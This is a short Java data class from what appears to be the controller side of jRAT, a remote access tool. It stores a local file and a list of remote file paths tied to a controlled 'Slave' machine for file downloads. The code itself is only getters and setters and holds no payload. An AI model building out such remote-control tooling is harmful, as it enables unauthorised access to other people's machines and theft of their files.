package se.jrat.client;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

import se.jrat.client.packets.incoming.Packet29ServerDownloadFile;


public class FileData {

	private File localFile;
	private List<String> remoteFiles = new ArrayList<String>();

	public FileData(Slave slave) {
		Packet29ServerDownloadFile.data.put(slave, this);
	}

	public File getLocalFile() {
		return localFile;
	}

	public void setLocalFile(File localFile) {
		this.localFile = localFile;
	}

	public List<String> getRemoteFiles() {
		return remoteFiles;
	}

}
